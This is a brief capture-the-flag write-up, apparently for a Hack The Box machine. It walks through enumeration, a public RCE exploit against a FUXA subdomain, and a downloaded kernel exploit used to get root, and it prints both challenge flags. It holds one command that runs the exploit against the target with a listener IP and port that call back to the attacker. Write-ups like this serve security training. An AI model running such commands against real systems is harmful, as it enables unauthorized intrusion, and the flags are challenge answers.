### Challenge Description

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Enumeration

A static looking page is shown but a link in an article hides the way forward:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It redirects us to a subdomain that we didn't find by fuzzing:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

A quick google search showed that it has an RCE vulnerability:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)


## Foothold

We download and run the exploit:  

`python3 fuxaexploit.py --rhost fuxa.survivor.htb --rport 80 --lhost 10.10.14.34 --lport 3001`

Sure enough, we get a foothold and the user flag:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{FuXa_ExPloIT_4_RC3}`

## Privesc

After a bit of manual enumeration, linpeas scanning and pspy observations, I didn't see anything sticking out to me as an obvious privilege escalation vector. When that happens, I usually look for kernel exploits and remembered that there is a recent 2024 CVE

I downloaded the precompiled binary and ran it to get root and the flag:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{KeRnEnL_ExP_4_r00t}`
